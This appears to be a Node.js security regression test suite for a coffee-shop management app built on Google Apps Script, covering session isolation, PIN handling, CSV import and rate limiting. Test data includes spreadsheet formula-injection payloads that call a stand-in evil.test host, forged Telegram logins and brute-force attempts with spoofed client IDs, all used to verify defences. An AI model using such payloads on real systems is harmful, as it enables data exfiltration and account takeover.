import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import vm from 'node:vm';
import crypto from 'node:crypto';
import { fileURLToPath } from 'node:url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const root = path.resolve(__dirname, '..');
const gasPath = fs.existsSync(path.resolve(root, 'gas/Code.gs'))
  ? path.resolve(root, 'gas/Code.gs')
  : path.resolve(root, 'Code.gs');
const cloudPath = path.resolve(root, 'js/cloud-sync.js');
const csvPath = path.resolve(root, 'js/pos-csv-parser.js');
const hasGas = fs.existsSync(gasPath);

function createMockSheet(name) {
  const rows = [];
  const norm = (n) => Math.max(1, n);
  return {
    getName: () => name,
    getLastRow: () => rows.length,
    getLastColumn: () => rows.reduce((m, r) => Math.max(m, r.length), 0),
    appendRow: (r) => { rows.push(Array.from(r)); },
    clearContents: () => { rows.length = 0; },
    deleteRow: (r) => { rows.splice(r - 1, 1); },
    getDataRange: () => ({
      getValues: () => (rows.length ? rows.map((r) => Array.from(r)) : [['']])
    }),
    getRange: (r, c, nr = 1, nc = 1) => ({
      getValues: () => {
        const out = [];
        for (let i = 0; i < nr; i++) {
          const row = rows[r - 1 + i] || [];
          const slice = [];
          for (let j = 0; j < nc; j++) slice.push(row[c - 1 + j] ?? '');
          out.push(slice);
        }
        return out;
      },
      setValues: (vals) => {
        for (let i = 0; i < vals.length; i++) {
          const ri = r - 1 + i;
          while (rows.length <= ri) rows.push([]);
          for (let j = 0; j < vals[i].length; j++) rows[ri][c - 1 + j] = vals[i][j];
        }
      },
      setValue: (v) => {
        const ri = r - 1;
        while (rows.length <= ri) rows.push([]);
        rows[ri][c - 1] = v;
      },
      setFontWeight: function () { return this; },
      setBackground: function () { return this; },
      setFontColor: function () { return this; }
    }),
    setFrozenRows: () => {},
    autoResizeColumns: () => {}
  };
}

function createGasSandbox({ boundSpreadsheet = true } = {}) {
  const sheets = new Map();
  const props = new Map();
  const cache = new Map();
  const mockSs = {
    getId: () => 'TEST_SHEET_ID',
    getSheetByName: (n) => sheets.get(n) || null,
    insertSheet: (n) => { const sh = createMockSheet(n); sheets.set(n, sh); return sh; },
    getSheets: () => Array.from(sheets.values())
  };
  const sandbox = {
    console, Date, Math, JSON, Object, Array, String, Number, Boolean, RegExp, Error, Set, Map,
    Logger: { log: () => {} },
    Session: { getScriptTimeZone: () => 'GMT+2' },
    SpreadsheetApp: {
      getActiveSpreadsheet: () => (boundSpreadsheet ? mockSs : null),
      openById: (id) => {
        if (!id) throw new Error('Invalid ID');
        return mockSs;
      }
    },
    PropertiesService: {
      getScriptProperties: () => ({
        getProperty: (k) => (props.has(k) ? props.get(k) : null),
        setProperty: (k, v) => { props.set(k, String(v)); },
        deleteProperty: (k) => { props.delete(k); }
      })
    },
    CacheService: {
      getScriptCache: () => ({
        get: (k) => (cache.has(k) ? cache.get(k) : null),
        put: (k, v) => { cache.set(k, String(v)); },
        remove: (k) => { cache.delete(k); }
      })
    },
    LockService: { getScriptLock: () => ({ waitLock: () => true, releaseLock: () => {} }) },
    ContentService: {
      MimeType: { JSON: 'application/json' },
      createTextOutput: (txt) => ({ _t: txt, setMimeType: function () { return this; }, getContent: function () { return this._t; } })
    },
    Utilities: {
      DigestAlgorithm: { SHA_256: 'sha256' },
      Charset: { UTF_8: 'utf8' },
      computeDigest: (_alg, str) => Array.from(crypto.createHash('sha256').update(String(str), 'utf8').digest()),
      getUuid: () => crypto.randomUUID(),
      formatDate: (d, _tz, fmt) => {
        const dt = d instanceof Date ? d : new Date(d);
        const pad = (n) => String(n).padStart(2, '0');
        if (fmt === 'yyyy-MM-dd') return `${dt.getFullYear()}-${pad(dt.getMonth() + 1)}-${pad(dt.getDate())}`;
        if (fmt === 'HH:mm:ss') return `${pad(dt.getHours())}:${pad(dt.getMinutes())}:${pad(dt.getSeconds())}`;
        if (fmt === 'HH:mm') return `${pad(dt.getHours())}:${pad(dt.getMinutes())}`;
        return dt.toISOString();
      }
    },
    ScriptApp: {
      getProjectTriggers: () => [],
      newTrigger: () => ({ timeBased: () => ({ everyMinutes: () => ({ create: () => {} }), atHour: () => ({ everyDays: () => ({ create: () => {} }) }) }) })
    },
    UrlFetchApp: { fetch: () => ({ getResponseCode: () => 200, getContentText: () => '{"ok":true}' }) }
  };
  vm.createContext(sandbox);
  vm.runInContext(fs.readFileSync(gasPath, 'utf8'), sandbox, { filename: 'Code.gs' });
  return { sandbox, sheets, props, mockSs };
}

test('P0.1/P0.3 Static security audit: no hardcoded PINs, TG IDs, or local auth bypasses in HTML clients', () => {
  for (const fn of ['index.html', 'dashboard.html', 'owner.html']) {
    const src = fs.readFileSync(path.resolve(root, fn), 'utf8');
    assert.equal(/adminPin\s*=\s*['"]1234['"]/.test(src), false, `${fn} must not contain hardcoded adminPin`);
    assert.equal(/pin:\s*['"]1234['"]/.test(src), false, `${fn} must not contain hardcoded staff pin 1234`);
    assert.equal(/pinBuf\s*===\s*st\.pin/.test(src), false, `${fn} must not compare PIN locally`);
    assert.equal(/entered\s*===\s*state\.adminPin/.test(src), false, `${fn} must not allow local adminPin fallback`);
    assert.equal(/TG-518294012|TG-604912338/.test(src), false, `${fn} must not contain hardcoded Telegram IDs`);
  }
});

test('P0.4 Code.gs contains no hardcoded spreadsheet ID and throws SETUP_REQUIRED when unconfigured', { skip: !hasGas }, () => {
  const gasSrc = fs.readFileSync(gasPath, 'utf8');
  assert.equal(gasSrc.includes('HARDCODED_PROD_SHEET_ID_FORBIDDEN'), false, 'Code.gs must not hardcode spreadsheet ID');
  const { sandbox } = createGasSandbox({ boundSpreadsheet: false });
  assert.throws(() => sandbox.getTargetSpreadsheet_(), /SETUP_REQUIRED/);
});

test('P0.2 Server-verified PIN change rejects wrong oldPin, updates hash, revokes old session, and enforces new PIN', { skip: !hasGas }, () => {
  const { sandbox, mockSs } = createGasSandbox({ boundSpreadsheet: true });
  sandbox.УСТАНОВИТЬ_ПАРОЛЬ_1234_И_ЗАПУСТИТЬ('TEST_SHEET_ID');
  sandbox.saveStaff_(mockSs, { name: 'Соня', role: 'Бариста', pin: '1234', active: 'да' });

  const login1 = JSON.parse(sandbox.doPost({ postData: { contents: JSON.stringify({ action: 'auth_login', role: 'staff', name: 'Соня', pin: '1234' }) } }).getContent());
  assert.equal(login1.ok, true);
  assert.ok(login1.sessionToken);

  // Wrong oldPin must fail
  const badChg = JSON.parse(sandbox.doPost({ postData: { contents: JSON.stringify({ action: 'change_staff_pin', staffName: 'Соня', oldPin: '9999', newPin: '4829' }) } }).getContent());
  assert.equal(badChg.ok, false);

  // Valid oldPin must succeed and bump session epoch
  const okChg = JSON.parse(sandbox.doPost({ postData: { contents: JSON.stringify({ action: 'change_staff_pin', staffName: 'Соня', oldPin: '1234', newPin: '4829' }) } }).getContent());
  assert.equal(okChg.ok, true);
  assert.equal(okChg.pinChanged, true);

  // Old session must be revoked (epoch mismatch)
  const oldSessCheck = sandbox.getServerSession_(login1.sessionToken);
  assert.equal(oldSessCheck, null, 'Old session token must be invalidated after PIN change');

  // Old PIN must fail, new PIN must succeed
  const loginOld = JSON.parse(sandbox.doPost({ postData: { contents: JSON.stringify({ action: 'auth_login', role: 'staff', name: 'Соня', pin: '1234' }) } }).getContent());
  assert.equal(loginOld.ok, false);
  const loginNew = JSON.parse(sandbox.doPost({ postData: { contents: JSON.stringify({ action: 'auth_login', role: 'staff', name: 'Соня', pin: '4829' }) } }).getContent());
  assert.equal(loginNew.ok, true);

  // auth_logout must revoke the new session
  const logoutRes = JSON.parse(sandbox.doPost({ postData: { contents: JSON.stringify({ action: 'auth_logout', sessionToken: loginNew.sessionToken }) } }).getContent());
  assert.equal(logoutRes.ok, true);
  assert.equal(sandbox.getServerSession_(loginNew.sessionToken), null, 'Session must be revoked after auth_logout');
});

test('P0.5 POS CSV re-import is idempotent for warehouse deduction and uses composite transaction dedup key across dates', { skip: !hasGas }, async () => {
  const { sandbox, mockSs, sheets } = createGasSandbox({ boundSpreadsheet: true });
  sandbox.УСТАНОВИТЬ_ПАРОЛЬ_1234_И_ЗАПУСТИТЬ('TEST_SHEET_ID');
  const login = JSON.parse(sandbox.doPost({ postData: { contents: JSON.stringify({ action: 'auth_login', role: 'admin', pin: '1234' }) } }).getContent());
  const tok = login.sessionToken;

  const beans0 = sandbox.getSeededInventory_(mockSs).find((x) => x.id === 'inv_beans_illy').stock;
  const csvMod = await import(csvPath);
  const csvParser = csvMod.default || csvMod;
  const sampleCsv = 'Дата;Кассир;Товар;Количество;Сумма\n2026-11-20;Сырбу;Капучино;10;190';
  const parsed = csvParser.parsePosBatch([{ name: 'report_2026-11-20.csv', text: sampleCsv }]);

  // Import #1
  const r1 = JSON.parse(sandbox.doPost({ postData: { contents: JSON.stringify({ action: 'batch_submit_cash', sessionToken: tok, days: parsed.days, mergeMode: 'sum' }) } }).getContent());
  assert.equal(r1.ok, true);
  const beans1 = sandbox.getSeededInventory_(mockSs).find((x) => x.id === 'inv_beans_illy').stock;
  assert.equal(beans1, beans0 - 90, 'First import deducts 90g beans');

  // Import #2 (exact same CSV re-imported) — MUST NOT deduct again
  const r2 = JSON.parse(sandbox.doPost({ postData: { contents: JSON.stringify({ action: 'batch_submit_cash', sessionToken: tok, days: parsed.days, mergeMode: 'sum' }) } }).getContent());
  assert.equal(r2.ok, true);
  const beans2 = sandbox.getSeededInventory_(mockSs).find((x) => x.id === 'inv_beans_illy').stock;
  assert.equal(beans2, beans1, 'Re-importing identical CSV must NOT double-deduct warehouse stock');

  // Composite transaction dedup: same receiptNo #101 on two different dates must BOTH be stored
  sandbox.submitCash_(mockSs, {
    date: '2026-11-20', cash: 100, card: 0, checks: 1, barista: 'Соня',
    transactions: [{ date: '2026-11-20', time: '09:00', receiptNo: '101', amount: 100, paymentType: 'cash', userRaw: 'Сырбу' }]
  });
  sandbox.submitCash_(mockSs, {
    date: '2026-11-21', cash: 120, card: 0, checks: 1, barista: 'Соня',
    transactions: [{ date: '2026-11-21', time: '09:05', receiptNo: '101', amount: 120, paymentType: 'cash', userRaw: 'Сырбу' }]
  });
  // Duplicate on same date 2026-11-21 must be skipped
  const dupTx = sandbox.submitCash_(mockSs, {
    date: '2026-11-21', cash: 120, card: 0, checks: 1, barista: 'Соня',
    transactions: [{ date: '2026-11-21', time: '09:05', receiptNo: '101', amount: 120, paymentType: 'cash', userRaw: 'Сырбу' }]
  });
  assert.equal(dupTx.txSkipped, 1, 'Duplicate check on same date/cashier must be skipped');
  const txSheet = sheets.get('Транзакции');
  assert.equal(txSheet.getLastRow(), 3, 'Header + 2 distinct date transactions with receiptNo 101 must be stored');
});

test('P0.1/P0.4/P1.4/P1.5/Sec6/Sec7 Audit Hardening: strict admin/staff session isolation, submit_checklist contract, honest finance label, single SW registration', () => {
  const cs = fs.readFileSync(path.join(root, 'js/cloud-sync.js'), 'utf8');
  const dash = fs.readFileSync(path.join(root, 'dashboard.html'), 'utf8');
  const gasPath = fs.existsSync(path.join(root, 'gas/Code.gs'))
    ? path.join(root, 'gas/Code.gs')
    : path.join(root, 'gas', 'Code.gs');
  const gas = fs.readFileSync(gasPath, 'utf8');

  // 1. No blind adminToken || staffToken fallback in gasPost
  assert.ok(!cs.includes('sess.adminToken || sess.staffToken'), 'gasPost must not blindly mix adminToken and staffToken');
  assert.ok(cs.includes('resolveTokenForAction'), 'cloud-sync must isolate tokens by action role');

  // 2. Load cloud-sync in VM and verify simultaneous Owner + Barista token isolation
  const ctx = { window: { COFFEE_CONFIG: { API_URL: 'https://example.com/exec' } }, navigator: { onLine: true }, localStorage: { getItem: () => null, setItem: () => {} }, setTimeout, clearTimeout, console };
  vm.runInNewContext(cs, ctx);
  const api = ctx.window.CoffeeCloudV94;
  const bothSess = { adminToken: 'st_admin_999', staffToken: 'st_staff_111' };
  assert.equal(api.resolveTokenForAction('submit_cash', {}, bothSess), 'st_staff_111', 'staff action must strictly use staffToken');
  assert.equal(api.resolveTokenForAction('submit_checklist', {}, bothSess), 'st_staff_111', 'checklist submit must strictly use staffToken');
  assert.equal(api.resolveTokenForAction('change_staff_pin', {}, bothSess), 'st_staff_111', 'staff PIN change must default to staffToken');
  assert.equal(api.resolveTokenForAction('save_staff', {}, bothSess), 'st_admin_999', 'admin action must strictly use adminToken');
  assert.equal(api.resolveTokenForAction('save_checklist_blocks', {}, bothSess), 'st_admin_999', 'block edit must strictly use adminToken');
  assert.equal(api.resolveTokenForAction('save_staff', {}, { adminToken: '', staffToken: 'st_staff_111' }), '', 'staffToken must NEVER authorize admin action');

  // 3. Server resolveVerifiedStaffSession_ enforces sess.role === 'staff'
  assert.ok(gas.includes("if (sess && sess.role === 'staff' && sess.staffName)"), 'GAS resolveVerifiedStaffSession_ must enforce role === staff');

  // 4. dispatchOperation maps checklist.submit -> submit_checklist
  assert.ok(cs.includes("'checklist.submit': 'submit_checklist'"), 'dispatchOperation must map checklist.submit to submit_checklist');

  // 5. Honest finance label & warehouse server error guard
  assert.ok(!dash.includes('Чистый итог'), 'dashboard must use Остаток после расходов instead of misleading Чистый итог');
  assert.ok(dash.includes('Остаток после расходов'), 'dashboard must show Остаток после расходов');
  assert.ok(dash.includes('res.ok === false && !res.queued'), 'warehouse save must abort local mutation on server ok:false');

  // 6. Single canonical SW registration (not duplicated inside cloud-sync.js)
  assert.ok(!cs.includes("navigator.serviceWorker.register('./sw.js')"), 'cloud-sync.js must not duplicate SW registration');
});

test('P0-1, P1-5, P1-10 Audit v98.7.0: Telegram auto-login requires HMAC, staff batch_submit_cash restricted, public get_checklists minimal', { skip: !hasGas }, () => {
  const { sandbox } = createGasSandbox();
  sandbox.УСТАНОВИТЬ_ПАРОЛЬ_1234_И_ЗАПУСТИТЬ('SEC_TEST_SHEET');
  sandbox.saveStaff_(sandbox.getTargetSpreadsheet_(), { name: 'Соня', role: 'Бариста', pin: '1234', active: 'да', tgId: 'TG-99887766' });

  // P0-1: Forged Telegram auto-login without valid HMAC initData MUST fail
  const forgedTg = JSON.parse(sandbox.doPost({
    postData: { contents: JSON.stringify({ action: 'auth_login', role: 'staff', tgId: 'TG-99887766', autoLogin: true }) }
  }).getContent());
  assert.equal(forgedTg.ok, false, 'Telegram auto-login without HMAC must be rejected');
  assert.match(String(forgedTg.error || ''), /TG_AUTH_INVALID/i);

  // P1-5: Staff cannot use replace mode or historical dates in batch_submit_cash
  const staffLogin = JSON.parse(sandbox.doPost({
    postData: { contents: JSON.stringify({ action: 'auth_login', role: 'staff', staffName: 'Соня', pin: '1234' }) }
  }).getContent());
  assert.equal(staffLogin.ok, true);
  const badReplace = JSON.parse(sandbox.doPost({
    postData: { contents: JSON.stringify({
      action: 'batch_submit_cash',
      sessionToken: staffLogin.sessionToken,
      mergeMode: 'replace',
      days: [{ date: '2026-01-01', cash: 100, card: 100, revenue: 200, checks: 5 }]
    }) }
  }).getContent());
  assert.equal(badReplace.ok, false, 'Staff must not be allowed to use replace mode or historical dates');
  assert.match(String(badReplace.error || ''), /FORBIDDEN/i);

  // P1-10: Public get_checklists must NOT expose inventory, dailyPlans, or shiftRoster
  const pub = JSON.parse(sandbox.doGet({ parameter: { action: 'get_checklists' } }).getContent());
  assert.equal(pub.ok, true);
  assert.equal(pub.inventory, undefined, 'Public get_checklists must not expose inventory');
  assert.equal(pub.dailyPlans, undefined, 'Public get_checklists must not expose dailyPlans');
  assert.equal(pub.shiftRoster, undefined, 'Public get_checklists must not expose shiftRoster');
});

test('P0-3, P2, P3 Audit v98.7.0: setup_initial_credentials requires INITIAL_SETUP_CODE, formula injection neutralized, RESET_ property deleted on use', { skip: !hasGas }, () => {
  const { sandbox } = createGasSandbox();
  const props = sandbox.PropertiesService.getScriptProperties();
  props.setProperty('TARGET_SPREADSHEET_ID', 'SEC_TEST_P03');
  const ss = sandbox.getTargetSpreadsheet_();
  sandbox.ensureSheets_(ss);

  // P0-3: Public setup_initial_credentials without INITIAL_SETUP_CODE MUST be blocked
  const hijack = JSON.parse(sandbox.doPost({
    postData: { contents: JSON.stringify({ action: 'setup_initial_credentials', newAdminPin: '9999' }) }
  }).getContent());
  assert.equal(hijack.ok, false);
  assert.match(String(hijack.error || ''), /SETUP_CODE_REQUIRED/i);

  // With INITIAL_SETUP_CODE set, raw 64-hex hash MUST still be rejected
  props.setProperty('INITIAL_SETUP_CODE', 'ONE_TIME_8842');
  const hexAttempt = JSON.parse(sandbox.doPost({
    postData: { contents: JSON.stringify({ action: 'setup_initial_credentials', setupCode: 'ONE_TIME_8842', newAdminPin: 'a'.repeat(64) }) }
  }).getContent());
  assert.equal(hexAttempt.ok, false);
  assert.match(String(hexAttempt.error || ''), /VALIDATION_FAILED/i);

  // Valid numeric PIN + valid INITIAL_SETUP_CODE succeeds and deletes INITIAL_SETUP_CODE
  const okSetup = JSON.parse(sandbox.doPost({
    postData: { contents: JSON.stringify({ action: 'setup_initial_credentials', setupCode: 'ONE_TIME_8842', newAdminPin: '4829' }) }
  }).getContent());
  assert.equal(okSetup.ok, true);
  assert.equal(props.getProperty('INITIAL_SETUP_CODE'), null, 'One-time setup code must be deleted after use');

  // P2: Formula injection neutralized with leading apostrophe in expenses
  sandbox.addExpense_(ss, { date: '2026-11-25', category: '=HYPERLINK("https://evil.test","Click")', amount: 150, comment: '+IMPORTXML("https://evil.test","//a")' });
  const expRows = ss.getSheetByName('Расходы').getDataRange().getValues();
  const lastExp = expRows[expRows.length - 1];
  assert.ok(String(lastExp[2]).startsWith("'="), 'Category formula must be neutralized with leading apostrophe');
  assert.ok(String(lastExp[4]).startsWith("'+"), 'Comment formula must be neutralized with leading apostrophe');

  // P3: Consuming staff PIN reset code deletes RESET_<name> property
  const gen = sandbox.issueStaffResetCode_(ss, { staffName: 'Соня' });
  assert.equal(gen.ok, true);
  assert.ok(props.getProperty('RESET_Соня'), 'RESET_ property exists before use');
  assert.equal(sandbox.consumeStaffResetCode_('Соня', gen.resetCode), true);
  assert.equal(props.getProperty('RESET_Соня'), null, 'RESET_ property must be deleted after consumption');
});

test('v98.7.0 Hardening: CSP meta present in HTML clients, no fake BKP- backup stub in Code.gs', () => {
  const dash = fs.readFileSync(path.resolve(__dirname, '../dashboard.html'), 'utf8');
  const idx = fs.readFileSync(path.resolve(__dirname, '../index.html'), 'utf8');
  const gasCode = fs.readFileSync(path.resolve(__dirname, '../gas/Code.gs'), 'utf8');
  assert.match(dash, /http-equiv="Content-Security-Policy"/);
  assert.match(idx, /http-equiv="Content-Security-Policy"/);
  assert.ok(!gasCode.includes("backupId: 'BKP-'"), 'Fake BKP- backup stub must be replaced by real createServerBackup_');
  assert.ok(gasCode.includes('function createServerBackup_('));
});

test('v98.7.0 Audit: Brute-force rate limit holds even when attacker rotates clientId, and doGet rejects URL tokens', { skip: !hasGas }, () => {
  const { sandbox } = createGasSandbox();
  sandbox.УСТАНОВИТЬ_ПАРОЛЬ_1234_И_ЗАПУСТИТЬ('BF_TEST_SHEET');

  let lastRes = null;
  for (let i = 0; i < 6; i++) {
    lastRes = JSON.parse(sandbox.doPost({
      postData: { contents: JSON.stringify({ action: 'auth_login', role: 'admin', pin: '9999', clientId: 'spoof_' + i }) }
    }).getContent());
  }
  assert.equal(lastRes.ok, false);
  assert.match(String(lastRes.error || ''), /RATE_LIMIT|заблокирован|повторите/i, 'Spoofed clientId must NOT bypass brute-force lockout');

  const getTok = JSON.parse(sandbox.doGet({ parameter: { action: 'unknown_secret', sessionToken: 'fake_tok' } }).getContent());
  assert.equal(getTok.ok, false);
  assert.match(String(getTok.error || ''), /METHOD_NOT_ALLOWED/i);
});
